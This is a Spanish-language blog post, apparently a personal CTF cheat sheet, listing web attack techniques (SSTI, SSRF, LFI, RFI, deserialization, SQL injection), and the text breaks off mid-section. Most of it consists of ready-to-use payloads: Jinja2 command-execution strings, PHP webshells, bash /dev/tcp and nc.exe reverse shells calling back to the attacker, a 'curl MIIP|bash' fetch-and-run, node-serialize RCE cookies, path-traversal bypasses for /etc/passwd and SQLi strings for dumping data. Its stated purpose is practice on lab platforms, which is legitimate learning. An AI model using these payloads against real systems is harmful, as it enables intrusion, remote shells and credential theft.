---
title: Método Hacking Web
author: guiseporaki
date: 2023-02-24
categories: [Hacking Web]
tags: [SSTI, XSS, XXE, LFI, RFI, Deserialization Attack, SQLi, Fuerza Bruta, XSRF/CSRF]
---

# Método básico para hacking web


### Y esto... ¿a qué fin?

La idea de hacer este documento es tener un chuletario para mí, algo más ordenado que mis notas del obsidian -gran programa-, y también dejarlo público por si alguien le puede ayudar ;).


### Recomendaciones y avisos:

- Todas las máquinas que nombro son de las plataformas hackthebox, vulnhub y portswigger, y si pongo "visto en máquina X" me refiero a que lo he visto en el canal de youtube de s4vionlive, del fenómeno y figura Marcelo Vázquez, también conocido como s4vitar.
- Recomiendo filtrar en https://machines-javiermolines.vercel.app/ por el tipo de ataque que quieras saber más. Es una herramienta que guarda todas las máquinas realizadas por s4vitar.
- Aunque lo este nombrando mucho no solo esta s4vitar. Prueba otras formas de realizar las máquinas que te propones vulnerar.


Ahora al lío, empecemos con los ataques via web.

___

## SSTI - Service Side Template Attack

### **¿Qué es?**

Es un ataque de inyección de código por parte del servidor por un fallo en la programación del código a la hora de generar los templates.

### **¿Cuándo pensar en hacer?**

- Si encontramos Flask o Python, en el wappalyzer o donde sea, podemos pensar ya en un posible SSTI.
- Si yo como input puedo controlar lo que a nivel de uotput se reporta/visualiza podemos pensar en un SSTI. Incluso sin reportarse podríamos probar fuzzeando por caracteres especiales buscando un error que de más info.

### **Objetivo**

- Ejecutar comandos -RCE- y conseguir acceso a la máquina.
- Leer archivos comprometidos.

### **Detección del ataque**

Empieza a probar con este input; $\{\{<%[%'"<\}\}%\


Ese anterior input lo uso para buscar errores o diferencias de output entre un input payload y un input estandar. Incluso aunque no se reportara el input se puede probar para generar errores.

Empiezo con unas operaciones matemáticas como inputs:

\{\{7\*7\}\}  

$\{7\*7\}  
	
<%= 7\*7 %>  

$\{\{7\*7\}\}  

#\{7\*7\}  

*\{7\*7\} 


Si en alguno de los casos se realiza la operación es vulnerable a SSTI.


### **Identificar el motor/procesador de plantillas o template engine**

Una vez detectado que es vulnerable a SSTI, el procedimiento lógico sería averiguar que motor de plantillas corre detrás (ninja2, mako, twig, tornado, etc). Hay mogollón de ellos, pero con suerte, o no, muchos se parecen para no incordiar al código html.

Si no te ha salido algun error ya con los payloads anteriores, pudiendo así visualizar algo más de info como el nombre del procesador de plantilla, prueba estos payloads, les gusta las gresca y pueden generar errores:

$\{\}    
\{\{\}\}      
<%= %>    
$\{7/0\}     
\{\{7/0\}\}    
<%= 7/0 %>  
$\{foobar\}  
\{\{foobar\}\}  
<%= foobar>


Si te fijas es fácil, el interior se va repitiendo, solo cambia la etiqueta.

Si esos payloads no generan ningun error que te indique el procesador de plantillas que esta por detrás entonces puedes usar el árbol de flujo de abajo con payloads de operaciones matemáticas, si las evalua sigue el flujo hasta encontrarlo.  
También puedes grepear por las operaciones que estan siendo válidas en la [web de hacktricks][hacktricks] y en el [repositorio de payloadsallthething][patt] para ver coincidencias en lenguajes y seguir.

[hacktricks]: https://book.hacktricks.xyz/welcome/readme

[patt]: https://github.com/swisskyrepo/PayloadsAllTheThings 


![SSTI Diagrama]({{ 'assets/img/apuntes/hackingweb/sstiflujo.png' | relative_url }}){: .center-image }

Por ejemplo, cargamos el \{\{7\*7\}\} evalua la operación, resultado 49, ahora inyectaremos el payload \{\{7\*'7'\}\}, si devuelve 49 es Twig, si en cambio devuelve 7777777 es jinja2. Todo esto se puede ver en payloadsAllTheThings en github. También esta explicado muy bien en: https://riteshpuvvada.github.io/posts/ssti/

### **Explotación**

Una vez identificado el motor de plantillas; lee, informate y entiende el funcionamiento de ese motor, sintaxis básica, tampoco tienes que convertirte en un profesional, aunque si la explotación se te pone díficil pues igual tienes que convertirte en un experto.

Suelo ir a [payloadsAllTheThings][patt] -la ostia de repositorio github-. Estaría guay que al menos te detengas y entiendas lo que hace, y si no bueno..cuando te falle y te toque investigar no te quedará otra e igual aprendes con más ganas quien sabe, a mi me pasa más esto último.

Ejemplo de explotación, la máquina es vulnerable a ssti y la plantilla que corre por detrás es ninja2, que es la que mas veces me he encontrado.

**Payload para leer los archivos en ninja2:**  

\{\{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() \}\}

Para el resto de lineas de comandos del repositorio de [payloadsAllTheThings][patt] necesitamos como un número de índice de la clase -que se puede encontrar con otros comandos-, el de [40] de la foto de abajo. Leído y más info en https://riteshpuvvada.github.io/posts/ssti/.


![Jinja2 Read]({{ 'assets/img/apuntes/hackingweb/jinja2-1.png' | relative_url }}){: .center-image }

Intentamos leer el archivo /etc/passwd, ¿qué funciona y existen usuarios?: entonces buscamos si tienen clave privada **id_rsa** leyendo en /home/USER/.ssh/id_rsa
Esto si estamos contra un Linux claro, en Windows la cosa cambia.
Contra Windows ya probaría el rce(remote command execution) e intentar lanzarnos reverse con ayuda de netcat o el nissang.

Si esta el id_rsa: Te lo guardas en local y desde la terminal:  
``` 
> chmod 600 id_rsa  
> ssh -i id_rsa USER@IPOBJETIVO
```  
Y con suerte ya estaría dentro.

**Payload para RCE en ninja2:**  

\{\{ self._TemplateReference__context.cycler.\__init__.__globals__.os.popen('id').read() \}\}

Si no te funciona el anterior ves probando en orden por las lineas de la siguiente imagen:


![Jinja2 RCE]({{ 'assets/img/apuntes/hackingweb/jinja2-2.png' | relative_url }}){: .center-image }

También puedes probar el de [payloadsAllTheThings][patt], el que pone **"Exploit the SSTI by calling Popen without guessing the offset"**, está modificado, he cambiado el popen por system y quitado buena parte de lo que sigue, quedaría añadir mi ip y si da problemas escapar las doble comillas:  
......['\_\_import__']\('os').system(“ping -c 1 MIIP”

![Jinja2 RCE2]({{ 'assets/img/apuntes/hackingweb/ssti-5.png' | relative_url }}){: .center-image }


Ó puedes probar este otro:  

\{\{config.\_\_class__.\_\_init__.\_\_globals__['os'].popen('ls').read()\}\}


---

## SSRF - Server Side Template Inyection

### **¿Qué es?**

Es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del lado del servidor realizar peticiones a un lugar no deseado. Se parece mucho a un RFI y también puede parecerse a un LFI.

En un ataque típico de SSRF el atacante puede hacer que el servidor realice una conexión a servicios internos dentro de la infraestructura de la organización, por ejemplo un puerto abierto solo internamente(solo pudiendo acceder desde su máquina), no se ve externamente porque puede haber reglas de firewall implementadas, las iptables.
Recuerdo que también podemos ver otras ips y servicios de la red interna que antes no podíamos ver.

### **¿Cuando pensar en hacer?**

En máquinas que he visto y realizado (fáciles y medias) se llega claramente a saber cuando hacerlo porque hay un recurso/utilidad(un cuadrito) en la web que te invita a poner ip, otra manera es interceptando petición con burpsuite y ver una redirección a una ip en la data. Como esa utilidad es de la máquina víctima al poner `http://localhost` estamos accediendo a la propia máquina y podremos ver los puertos abiertos internamente por ejemplo, entre otras cosillas.

Un ejemplo muy bueno para ver algún input SSRF es la máquina **Kotarak** de Hackthebox, en la que hacemos port discovery.
Ejemplo de SSRF, esta vez apuntando a máquina atacante para cargar archivo y obtener RCE, se puede ver en máquina **Time**.

### **Objetivo**

-Listar información de los puertos no visibles desde fuera de la máquina víctima.

-Si conoces alguna ruta de subida de archivos puedes probar a realizar un SSRF a maq atacante para cargar un recurso, como igual hace la petición con curl puedes probar a exportar con -o y la ruta absoluta(tendrás que averiguarla).

-Aunque no lo cuento como SSRF prueba antes algunas estructuras de RCE, por ejemplo estas:
```
; command       | command       || command      && command      $(command)
```
Visto todo en máquina **Haircut** (hackthebox). Si es efectiva a alguna de estas técnicas entonces ya pasaría a ser vulnerable a command inyection.

### **Explotación**

Empiezo por las mas básicas:
```
http://localhost
http://127.0.0.1
http://127.1
http://127.1:80
http://0
```

Si no consigues nada te dejo toda estas formas de “URL Format bypassing” en el caso de que hayan puesto una blacklist de inputs. Recogido de hacktricks:
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass


![SSRF-1]({{ 'assets/img/apuntes/hackingweb/ssrf-1.png' | relative_url }}){: .center-image }

![SSRF-2]({{ 'assets/img/apuntes/hackingweb/ssrf-2.png' | relative_url }}){: .center-image }

Si son nombres lo que no deja poner, por ejemplo `http://127.0.0.1/admin`, lo que creemos que no permite es el “admin” prueba a urlencodear algo de la palabra y el % lo urlencodeas también. Puede valer simplemente el alternar entre mayúsculas y minúsculas la palabra.

### Bypassing SSRF filters via open redirection

Algo así;

![SSRF-3]({{ 'assets/img/apuntes/hackingweb/ssrf-3.png' | relative_url }}){: .center-image }

Con open redirect devolverá la página de evil-user(ejemplo de arriba).
La diferencia que hay con el bypassing anterior es la existencia de un parámetro que te permitiría llamar a una dirección/dominio, incluido el propio. Ya sea mediante GET por la url o por POST por la data.

### SSRF via the Referer header

Algunas aplicaciones emplean un software de análisis del lado del servidor que rastrea a los visitantes. Este software suele registrar la cabecera Referer en las solicitudes, ya que es de especial interés para el seguimiento de los enlaces entrantes. A menudo, el software de análisis visitará cualquier URL de terceros que aparezca en la cabecera Referer. Esto se hace normalmente para analizar el contenido de los sitios de referencia, incluyendo el texto ancla que se utiliza en los enlaces entrantes. Como resultado la cabecera Referer a menudo representa una superficie de ataque fructífera para las vulnerabilidades SSRF.

Puedes probar a meter en el referer un servidor tuyo creado, si es en la misma red(mediante vpn) como pasa con máquinas en hackthebox hay conexión directa, en caso contrario tendrás que crearte una vps en la nube para poder conectarte al servidor víctima, o también con el burpsuite proffesional te viene el burpsuite colaborator que te crea un servidor en la nube temporal para usar.
Si es vulnerable igual puedes hacer que ejecute código malicioso de esa máquina.


Recuerda casos prácticos de lo que puedes conseguir con todas estas técnicas, esta claro que ver puertos internos abiertos y otros hosts en el dominio con más puertos y servicios de estos con lo que podrás recoger mas información.

### SSRF with whitelist-based input filters

Es decir, puede que el servidor web te oblige a poner un input con un nombre de la lista blanca. Por ejemplo en la data (pillada con burpsuite) tenemos el valor:
`apistock=http://piedras.com/loquesea`  
Imagina que en la lista blanca esta piedras.com, asi que tiene que estar sea como sea en la petición que vayamos a hacer.
Ahora bien, ¿Cómo meterlo sin que moleste?. Hay varias formas:

1-Recuerda que en algunos recursos puedes identificarte tipo:  
`http://user:password@piedras.com`  
`http://user@piedras.com`
Podrías hacerlo al revés:  
`http://piedras.com@Recursoquequieras`

2-En algunas urls se puede meter el simbolo # para indicar un fragmento de la página. Por ejemplo si en una página de wikipedia añades #historia te irá al apartado historia de esa página. Entonces podrías hacer algo como:
`https://Recursoquequieras#piedras.com`.  
Si no funciona prueba a urlencodear los símbolos, puedes hacerlo varias veces.

3- Url-encodea los caracteres para confundir, puede que los filtros se hagan con la data sin url-encodear. **Combina este con los anteriores**.

---

## LFI - Local File Inclusion

### **¿Qué es?**
Técnica que permite ver archivos locales del servidor a auditar/objetivo.

### **¿Cuando podemos pensar en ello?**
Podemos pensar en ello cuando desde un parámetro en la url se llama a un recurso de la web.

![LFI-1]({{ 'assets/img/apuntes/hackingweb/lfi-1.png' | relative_url }}){: .center-image }

En ese caso el parámetro filename llama a una imagen. A la derecha realizamos un directory traversal para intentar listar el /etc/passwd.
El directory traversal es fundamental en un LFI, básicamente intentamos ir directorios hacia atrás para poner la ruta absoluta del archivo que quieras visualizar, lo veremos más abajo.

### **Cosillas que podemos conseguir con un LFI:**

Queda claro que visualizaremos archivos de la máquina local -los que tengamos permisos para ello, es decir, si es el usuario del sistema que esta por detrás de la web, que es el que realiza por detrás el LFI, es digamos el usuario www-data entonces podremos visualizar los archivos que él tenga permiso para ver en la máquina víctima-.

Estaría de perlas ver archivos que te den acceso a la máquina, es nuestro principal objetivo, ¿Cuáles son esos archivos para **Linux**?:

+ `id_rsa`: En la ruta /home/USER/.ssh/id_rsa. Una vez obtenido; chmod 600 id_rsa (si no tendrás problemas de permisos); ssh -i id_rsa USER@IPOBJETIVO para conectar.  
Los usuarios los habrás sacado del /etc/passwd

+ `id_rsa.pub`: En la misma ruta que la anterior. Falta más info, pero creo que si la copias y llamas como authorized_keys en tu máquina te puedes conectar sin contraseña; ssh USER@IP

+ `authorized_keys`: Te lo copias, llamas igual en tu máquina y te conectas; ssh USER@IP

+ Ver los `logs`, normalmente en `/var/log/auth.log` -los de ssh, mediante código en USER al conectar con ssh-, y `/var/log/apache2/access.log` -el de apache, mediante cabeceras-. Para derivar a un RCE (Remote Command Execution), a esto se le llama log poissoning. Averigua donde pueden encontrarse las rutas de los logs en el tipo de servidor que aloja la web objetivo. Ejemplo Log poissoning en máquina Pivoting ,de Vulnhub.

+ Mediante el `/proc/self/environ` -es donde se guardan las variables de entorno del proceso actual(self). Si puedes acceder a él usando LFI puedes probar a meter código php malicioso en la cabeceras (con burpsuite por ejemplo). Procedimiento parecido al log poisoning.

+ Si puedes `subir un archivo` y encontrar donde se aloja puedes llamarlo desde el LFI y con suerte puede que se interprete.

Hay también dos wrapper(que conozca) para RCE, es raro que se den, pero hay que probar. Son estos dos:

+ `expect://`  -Por ejemplo; expect://whoami

+ `zip://<elzip.zip>%23<cmd.php>`   -Explico esto; el .zip (que también puedes probar a subirlo como .jpg por ejemplo) tienes que subirlo a la web objetivo. El .zip contiene un archivo cmd.php que contiene este payload por ejemplo <?php system($_REQUEST[‘cmd’]); ?>  
El %23 es un hashtag. Y claro, después del cmd.php añadirías parámetro y el comando; ….cmd.php&cmd=whoami  
Cacho ejemplo en máquina **CrimeStoppers** realizada al igual que todas las máquinas que he puesto por Marcelo Vázquez, subidas en su canal s4vionlive (en youtube).

Aparte de las rutas anteriores podriamos sacar más información, aunque menos potente a priori que las anteriores:

+ `/proc/net/tcp`: Para visualizar puertos de la máquina, estarán en hexadecimal.
+ `Rutas de recursos interesantes` del servidor, CMS, o aplicaciones que haya. Por ejemplo `/etc/apache2/sites-enabled/000-default.conf` en apache.
Fuzzear recursos, por ejemplo .php para luego ver el código mediante el wrapper de base64.  
+ `/proc/shed_debug`: Procesos ejecutandose
+ `/proc/NUMERO/cmdline`: Cada número en el /proc pertenece a un proceso -ese número es un PID que se puede ver en el shed_debug-, y cada proceso tiene un archivo cmdline desde el cual puedes ver el onliner de invocación de ese proceso. ¡Y quien sabe!, igual lo lanzo con credenciales. Visto máquina **Backdoor** en video de s4vitar donde se crea un programa en python para hacer fuerza bruta a todos cmdline. Y en máquina **Retired** también se ve.
Esta ruta a veces solo podemos visualizarla por el burpsuite, ni idea porqué peeeero **prueba**.

**¿Y para Windows?**

Solemos mirar en el /etc/hosts de windows que es `\Windows\System32\Drivers\etc\hosts` de esta manera comprobamos que haya LFI.  
Luego a través del wrapper base64 por ejemplo mirar el código del index.php si lo hubiera, y fuzzear por otros .php y otros archivos para hacer lo mismo y así buscar información.

---

### Formas de eludir defensas/sanitizaciones del servidor al path traversal.

Los desarrolladores web usan sanitizaciones/técnicas defensivas para evitar esta vulnerabilidad, pero por supuesto, pueden ser eludidas(bypassear).
A veces no es tan fácil como usar esto: `http://webquesea/hola.php?filename=../../../../../../etc/passwd`  
Por cierto, puedes hacer esto ../../ tantas veces como quieras que va a ser lo mismo. Yo lo suelo hacer mínimo 6 veces, por si acaso.
Bueno..pues al hacer lo anterior no consigues ver el archivo, entonces habrá que probar mas cosillas.

Veamos algunas formas de bypassing, es decir, de eludir estas defensas:

+ `/etc/passwd` -hay veces que la búsqueda parte de la raiz.

+ `file:///etc/passwd` -usando el wrapper file.

+ `../../../../../../etc/passwd`  -La típica, puedes añadir wraper file también.

+ `….//….//….//….//….//….//etc/passwd` -Por si te sustituyen el ../ por nada.

+ `/etc/passwd%00.jpg ` -Uso del bynull, imagina que solo te permite subir archivos terminados con extensión .jpg. El bynull sirve para que no te interprete lo que va después de él, pero en cambio lo lee al comparar. Lo puedes añadir a todas las técnicas anteriores, la cosa es probar.

+ `php://filter/convert.base64-encode/resource=/etc/passwd` -Aunque es más utilizado para archivos php. Se usa para poder ver el código en base64, ya que la web interpreta el archivo y no se visualiza el código.

+ `..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`  - ¿cómo se llega a esto? Url-encodeas la / ,mandamos petición por si acaso funciona simplemente asi, posiblemente no, entonces url-encodeas el % y te saldrá ya así.

+ `WHITE LIST + técnicas anteriores`  -puede que el código te oblige a poner una ruta, es decir una white list, entonces la añades y desde ahí pruebas.


### **Notas**:

-Recuerda probar otros tipos de ataque en ese input como un SSRF y RFI.

-Hay más formas de eludir mediante LFI, aquí he puesto las principales en mi opinión.

---

### RFI - Remote File Inclusion

Este ataque se parece al LFI visto anteriormente, lo que cambia es que en vez de poder ver contenido de la propia máquina objetivo veremos o accederemos a recursos de otros servidores, incluido recursos que yo pueda crear en mi máquina.  
De esta manera podemos aprovechar el RFI de la máquina víctima para que carge e interprete como si fuera suyo un recurso malicioso.

Un ejemplo:

En esta página encontramos un RFI, la url sería;
`http://mesasysillas/file.php?file=http://miIp/archivoMalicioso.php`

Podemos crearnos un servidor con un php así, llamado por ejemplo reverse.php:

``` php
<?php
system(“bash -c ‘bash -i >& /dev/tcp/MiIp/Mipuerto 0>&1’”);
?>
```

Nos creamos un servidor en python para compartir ese recurso:
``` plaintext
> python3 -m http.server 80
```
Y os ponemos en escucha para recibir la consola:
``` plaintext
> nc -nlvp 443
```

Ahora en la url añadimos y realizamos petición:
`http://mesasysillas/file.php?file=http://miIp/reverse.php`  
Y nos llegaría la consola si todo ha ido bien.

En ese reverse.php hay maneras distintas de hacerlo, por ejemplo:

``` php
<?php
echo “<pre>” . shell_exec($_GET[‘cmd’]) . “</pre>”; 
?>
```
Y desde la url esta vez:
`http://mesasysillas/file.php?file=http://miIp/reverse.php&cmd=bash -c ‘bash -i …` y lo mismo.
A esto también se le conoce como webshell, lanzar comandos desde la web.

En máquinas **Windows** como objetivo podemos probar a realizar una carga de archivos a través de un recurso compartido con smbserver. En mi máquina creamos el recurso compartido:
```  
> smbserver.py smbFolder $(pwd) -smb2support
```` 
Y ahora desde la web objetivo:  
`http://pagequesea/algo.php?parametro=\\miIp\smbFolder\prueba`

Si nos llega conexión igual vemos un hash ntlmv2 que podemos intentar crackear, si no llega ese hash es raro pero podemos probar a continunar con esa herramienta -smbserver- ( yo lo hice y funcionó), o bien creamos credenciales para luego conectarnos con ellas -pero si no tenemos rce malamente-, o  tirar de net usershare. Visto máquina **Sniper**.
``` plaintext
> service smbd start
```
``` plaintext
> lsof -i:445
> net usershare add smbFolder $(pwd) ‘’ ‘Everyone:F’ ‘guest_ok=y’
```
Lo de **everyone:F** para que tengan todos privilegios máximos y lo de guest para permitir sesiones de invitados.

Y lo mismo desde la web o desde el burpsuite:
`http://pagequesea/algo.php?parametro=\\miIp\smbFolder\prueba`


Una vez que puedas descargar tus archivos compartidos tendremos que crear un php, un asp o un aspx, depende de lo que pueda interpretar, si vemos que en la web esta interpretando php podriamos probar primeramente con algo asi:
``` php
<?php
phpinfo();
?>
```
Lo anterior para ver que funciones están deshabilitadas. Después, por ejemplo (si system no está deshabilitada):
``` php
<?php
system($_REQUEST[‘cmd’]); 
?>
```

Ahora en la url:  
`http://pagequesea/algo.php?parametro=\\miIp\smbFolder\prueba&cmd=<comando>`

Donde ese comando para que en Windows te de una reverse shell podría ser;  
Comando= \\MIIP\smbFolder\nc.exe -e cmd MIIP MIPUERTO  
El comando, como ves, se ejecuta indicando de nuevo la ruta.
Antes de lanzar la petición te copias el nc.exe en la raiz de tu recurso compartido y te pones en escucha; `rlwrap nc -nlvp 443`  
También se podría meter la instrucción del netcat en el mismo php, visto máquina **Sniper** y **Streamio**, si no ya sabes.. buscas por RFI y Windows en el buscador de máquinas hechas por s4vi y habrá.

---

## Deserialization Attack

### **¿Qué es?**

La serialización es el proceso de convertir estructuras de datos complejas, como objetos y sus campos, en un formato más plano que se pueda enviar y recibir como un flujo secuencial de bytes.

La deserialización es el proceso de restaurar este flujo de bytes a una réplica completamente funcional del objeto original, en el estado exacto en que se serializó. La lógica del sitio web puede entonces interactuar con este objeto deserializado, como lo haría con cualquier otro objeto.

El riesgo surge cuando es la entrada del usuario lo que se va a deserializar, porque aquí puedes intentar manipular objetos serializados y pasar datos dañinos al código de la aplicación. Incluso es posible reemplazar un objeto serializado con otro de cualquier clase diferente que este disponible en el sitio web, por esto a veces se le conoce este ataque como una vulnerabilidad de **inyección de objetos**.

### **¿Qué podemos conseguir?**

Podemos lograr Remote Command Execution y para dentro.

### **¿Cuándo pensar en hacer?**

Si vemos en la cookie una cadena larga de letras y números podríamos pensarlo. Con algo de intuición, dada en buena parte por la experiencia, irás mejorando en reconocerlo.

Si conseguimos ver funciones de des/serialización de la data por algún lugar, por ejemplo a través de un LFI, podemos ver código y pillar esa info.

## Explotación

Esta página lo explica bien y hay data serializada y deserializada que podemos usar para nodejs: 
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Recomendaría realizar la siguiente instalación;  
``` plaintext
> npm install node-serialize 
```
Te instala el node-serialize para poder serializar y deserializar en local lo que tu quieras, así haces pruebas antes en tu máquina.

Al ejecutar; `node javaScriptObject`, siendo ese .js por ejemplo:

``` js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
var serialize = require('node-serialize');	
console.log("Serialized: \n" + serialize.serialize(y));
```
Te serializará ese objeto (pone serialize.serialize) y antes de serializarlo se ejecuta el comando. Esto es gracias al IIFE (Immediatily Invoke Fuction Expresion) -que son esos paréntesis antes de la coma-.

Ahora bien, normalmente la vulnerabilidad ocurre cuando el servidor web deserializa la data que tu mandes serializada. Hace algo así:
``` js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```
Donde la data serializada, que tendrás que encodear posiblemente a urlencode, que a su vez pasarás por ejemplo en una cookie seria:
``` plaintext
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```
Lo más rápido es que te copies el payload de arriba y pongas el comando que quieras -quitale /n /t puede que de problemas y encodea a urlencode-. Otra manera de hacerlo, algo más larga, es serializar un .js -donde metas el comando que quieras- y el objeto serializado pasarlo por el input(una cookie por ejemplo) que te deserialize el servidor objetivo, recuerda el IIFE(los paréntesis).

Los **comandos a realizar** que haría son:  
+ Primero un ping a mi máquina a ver si tengo rce.  
+ Segundo y final un `curl MIIP|bash`. Compartiendo servidor con python por ejemplo y creando un index.html asi:
``` html
#!/bin/bash

bash -i >& /dev/tcp/MIIP/PUERTO 0>&1
```
Me pongo en escucha por el puerto escogido `nc -nlvp PUERTO` y provoco la deserialización, por ejemplo metiendo el objeto serializado en la cookie y dando a actualizar.
Otra forma si da problemas, sería hacer en tu máquina local un `cat index.html | base64 -w 0; echo` Y ya el comando en la data serializada que fuera;
`echo “cadena enbase64”|base64 -d|bash`

Otra manera de hacerlo contra un node.js (también sale en la página web puesta arriba de opsecx), es con la herramienta **nodejsshell.py** en github, me lo copio en formato raw por ejemplo y luego;  
``` plaintext  
> wget <direccion>  
> python2 nodejsshell.py <MiIp> <Mipuerto>
```
Si tuvieras que serializar en php puedes visualizar la máquina **Tenet** (s4vionlive en youtube), la estructura estándar para crear un objeto y que que te serialize en el mismo script es:  

``` php
<?php
class nameclass
{
	public $variable1 = ‘contenido’
	public $varible2 = ‘’
}
$nameObjeto = new nameclass();
echo serialize($nameObjeto);
```
Al ejecutar ese script(con php claro) te saldría la data serializada que meter en el input.  

---
## SQLi - Inyección SQL

### **Recordatorio**
El objetivo de este escrito es un método para la realización del ataque mas que una explicación. Aun así, aquí dejo una pequeña definición y una clasificación de los tipos de inyecciones sql. Si querés mas y mejor info sobre esto recomiendo que ojeís esta página de github:
https://xdann1.github.io/posts/inyecciones-sql/

### **Recomendaciones y anotaciones**:
+ Recuerda que no solo puedes aplicar sqli en paneles de login si no también en otras opciones de input de usuario como por ejemplo urls con parámetros que me permitan peticiones. Por ejemplo mira la máquina **Enterprise** de hackthebox. Recuerda: Si lo haces por burpsuite urlencodear la data que envies por GET.  
+ En vez de -- - para el comentario podrías usar otras como por ejemplo el #.

### **Definición**:  
La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir en las consultas que una aplicación realiza a su base de datos. Generalmente permite a un atacante ver datos que normalmente no puede ver (por ejemplo información de otros usuarios).

### **¿Qué podemos conseguir?**
+ Obtención de información de la bases de datos.
+ Acceso panel de gestión de un determinado usuario o administrador vía web.
+ Intrusión a la máquina o más información, ya sea mediante credenciales obtenidas en la base da datos como mediante otros recursos; load_file, into outfile, etc.


### **Tipos de inyección**:

**In-band**: La salida de la consulta es visible en el front-end. Dos tipos dentro de esta:  
+ *Union Based*: Usamos la órden UNION para concatenar otra consulta SELECT y sacar de ahí más info.
+ *Error Based*: Provocamos errores para que nos devuelva la salida de la consulta.

**Blind**: La salida de la consulta no es visible por el front-end. Sacaremos la información letra a letra. Tipos:
   
+ *Boolean Based*: Usa condicionales de SQL para controlar si la página devuelve TRUE o FALSE. En base a las respuestas iremos averiguando info.  
+ *Time Based*: A partir de condicionales basados en tiempo sabremos cuando una petición es TRUE o FALSE y mediante ello iremos construyendo la información.

**Out-of-band**: No tendremos acceso directo a la salida de la consulta, ni a ciegas. Tendremos entonces que redirigir la salida hacia otro lugar.

### **Método** 
Recomendaría por comodidad realizar las inyecciones mediante Burpsuite desde el repeater.  
Primero probar credenciales típicas o por defecto del sitio en cuestión.   Algunas típicas son admin:admin, gest:guest, admin:1234, etc.

`admin’` Intentando provocar un error.  
`admin’ or 1=1-- -` Para entrar sin credenciales.   
`admin’ and 1=1-- -`  
`admin’) or 1=1-- -`

`admin’ order by <nº>-- -`  
Suelo empezar por 100 para ver el resultado cuando no es, y luego ya probar bien del 1 hasta el 8. Primero el 1; Si sale lo mismo para el 1 que para el 100 no creo que funcione. Si no sale lo de Unknow column o algun resultado distinto puedes probar directamente con el union.  
`admin’ order by 1,2,3,4,5,6,7,8,9,10,11,12-- -`  
Puede que salga unknown column <nº>, el anterior a ese es el número correcto de columnas.  
`admin’ group by <nº>-- -` Lo mismo que order by.


`admin’ union select 1-- -`  
Si lo muestra o da error será vulnerable. Si da error habrá que intentar con mas columnas poco a poco:  
`admin’ union select 1,2-- -` Ir subiendo hasta que se muestre en pantalla.    
`admin’ limit 1,1 into 1-- -` Lo mismo que union select, luego ir subiendo con into 1,2 y asi..

**Ataque Nosqli**:  
`<username>[$ne]=<kulo>&<password>[$ne]=<kulo>` Desde el burpsuite mejor.  
Si resulta ser vulnerable hay un modo de sacar usuarios y contraseñas brute forceando, visto máquina **Mango**.
Si no resulta ser vulnerable podrías probar a ponerlo en formato json, visto máquina **NodeBlog**.  
Para mas info sobre el Nosqli mira [payloadsAllTheThings][patt].

**Sigamos con el SQLi**:

Si no ha habido suerte con todo lo anterior empiezo con las inyecciones a ciegas.

**Inyecciones a ciegas**:

`admin’ or sleep(5)-- -`  
`admin’ and sleep(5)-- -`  Suele ir mejor con el and pero la primera consulta  debería ser válida para que funcione.  
`admin and sleep(5)-- -`

Si funciona pasaré a usar condicionales(if) junto a la función **substring()**, para jugar con ello podría crearme un script o modificar alguno que tenga ya, ó tirar de SQLMap. Ejemplo de uso de SQLMap visto en máquina **Enterprise**. Ejemplos del script en python en máquinas **Cronos** y **Europa**. Recuerdo que todas máquinas nombradas son de la plataforma HackTheBox y podéis verlas en el canal de s4vionlive(youtube).

`admin’ or ‘1’=’1`  Sin comentarios al final. Esta sería una boolean based, que sigue siendo del tipo a ciegas.  
`admin’ and ‘1’=1`   
Prueba con ‘2’=’1 para comprobar que la respuesta cambia entre verdadero y falso.

Si funciona empezaré a jugar con **substring()** para ir letra por letra hasta averiguar las bases, tablas, columnas y finalmente dumpear toda la data.  
Normalmente ,y como mejor, usar un script en python para ello. Ejemplo de script en python de este tipo de ataque en máquina **IMF**. Ejemplo del uso del substring;  
`select substring(schema_name,1,1) from information_schema.schemata limit 0,1=’LETRA` 

Esto; `select count(schema_name) from information_schema.schemata)=’NUMERO`   
Irá bien para luego en el script poner hasta que número de base da datos sacar.

Si no funciona nada de esto tiro ya de sqlmap -el tipo out-of-band no lo pruebo, para mas info de este ataque; https://www.youtube.com/watch?v=C-FiImhUviM&t=10178s -al final del video-. Y si tampoco saco nada entiendo que no es vulnerable, al menos para mí, y pruebo otras vías de ataque que no sean SQLi.

**¡¡Es vulnerable y puedo ver la salida de mis peticiones!!**. Empiezo entonces a **dumpear la data**:

`admin’ union select 1,@@version,3-- -` Lo primero es saber la base de datos que hay detrás. Aunque sea mysql puede valer con `version()` en vez del @@version.


Pero hay mas sistemas de bases de datos:

![SQLi-1]({{ 'assets/img/apuntes/hackingweb/sqli-1.png' | relative_url }}){: .center-image }

Ya sabiendo a que te enfrentas solo queda recoger toda la información que puedas. Voy a dejar la estructura de peticiones para MySQL porque es la más habitual(suponiendo que tenga una columna):
   
`union select database()-- -`

`union select schema_name from information_schema.schemata-- -`

`union select table_name from information_schema.tables where table_schema=”<nameDB>”-- -`

`union select column_name from information_schema.columns where table_schema=”<nameDB>” and table_name=”<nameTable>”-- -`

`union select group_concat(DATO1,0x3a,DATO2) from nameDB.nameTable-- -`

Si en la petición de la base de datos te sale solo una es que igual solo muestra de una en una, entonces podrías probar ya con `group_concat(schema_name) from ..` , o también con el `limit`.

Otras formas de sacar info:

`union select group_concat(table_name,”:”,column_name) from information.schema.columns where table_schema=”<BaseDeseada>”-- -`  
Te saldrían sus tablas con sus columnas pertinentes.

**Load_file e into outfile**:

Load_file: Para leer archivos. Ejemplos:

`‘union select 1,2,load_file(“/etc/passwd”)-- -`

Si lo lee buscamos id_rsa de los usuarios u otros archivos relevantes vistos en el apartado LFI.

Into outfile: Para crear y guardar archivo en la máquina víctima, ejemplos:

